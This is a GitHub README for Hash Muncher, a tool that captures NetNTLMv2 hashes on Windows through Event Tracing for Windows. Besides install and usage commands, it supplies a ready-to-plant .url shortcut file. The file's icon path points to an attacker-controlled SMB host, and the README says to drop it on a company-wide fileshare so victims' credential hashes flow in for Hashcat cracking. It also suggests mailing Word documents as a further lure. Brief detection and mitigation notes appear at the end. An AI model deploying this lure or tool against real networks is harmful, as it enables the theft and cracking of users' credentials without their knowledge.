# Hash Muncher

*Grab NetNTLMv2 hashes using ETW with administrative rights on Windows*

[![GitHub all releases](https://img.shields.io/github/downloads/lkarlslund/hashmuncher/total)](https://github.com/lkarlslund/hashmuncher/releases) ![GitHub Workflow Status](https://img.shields.io/github/actions/workflow/status/lkarlslund/hashmuncher/prerelease.yml?branch=main)

- Requires elevated (administrator) access on Windows 8.1 / Windows 2016 or later
- Uses Event Tracing for Windows (ETW) to get access to raw packet data for SMB authentication packets
- Decodes NTLM message types 2 and 3
- Outputs to stdout or to a file
- Press Ctrl-C to stop processing or use timeout option
- Crack hashes with HashCat using -m 5600

## Getting Hash Muncher

Three different options for getting this up and running

### A) Download auto built binaries from [releases](https://github.com/lkarlslund/hashmuncher/releases)

### B) Build and install on Windows with this Go command
- requires Golang

```bash
go install github.com/lkarlslund/hashmuncher@latest
```

### C) Cross compile the Windows binaries on any Golang supported platforms with PowerShell installed
- requires Golang and PowerShell
  
```powershell
git clone https://github.com/lkarlslund/hashmuncher
cd hashmuncher
./build.ps1
```

## Usage

1) Ensure that Windows Firewall allows "File and Printer Sharing" as Hash Muncher requires the built in SMB service to send recieve the initial request and send response packets to the target.

<img src="images\2023-05-09-12-02-27.png" width="40%">

2) In an elevated prompt run Hash Muncher

```bash
hashmuncher.exe [-output filename.txt] [-timeout nnn] [-tracename yourname] [-help]
```

3) Now wait for someone to authenticate against your machine, or plant an URL shortcut on a popular shared fileshare like below.


````
[InternetShortcut]
URL=Munch
WorkingDirectory=MunchMunch
IconFile=\\10.1.2.3\%USERNAME%.icon
IconIndex=1
````

Replace the IP address with your Hach Muncher machine, and save the file to a (company wide) fileshare as 'whatever.url', and watch the hashes come pouring in.

There are other methods mentioned at [Red Team Notes - Forced Authentication](https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication), and you can probably also get success by mailing everyone a Word document, but it's not stealthy at all.

## Detection

- None that I've seen, but please leave feedback

## Mitigation

- None for the ETW part, this is part of the Windows design says Microsoft
- Use STRONG passwords! Cracking NetNTLMv2 is not fast at all, but with weak passwords it can surely be done.
- Disable NTLM entirely! It probably won't be painless - but see [Farewell NTLM - It is time to disable NTLM](https://www.scip.ch/en/?labs.20210909)

## History

I've been playing with ETW on and off, but once I saw the very cool [research from Nettitude Labs](https://labs.nettitude.com/blog/etwhash-he-who-listens-shall-receive/) I knew I had to make this into an easy to use tool in my favourite language Golang! Nettitude Labs has a working [POC](https://github.com/nettitude/ETWHash) written in C# running under the .Net framework, and might be a better option for you. So I'm not really inventing anything here, just adding this as an alternative.

If you like Windows security stuff you might also like my attack graph tool [Adalanche](https://github.com/lkarlslund/Adalanche)
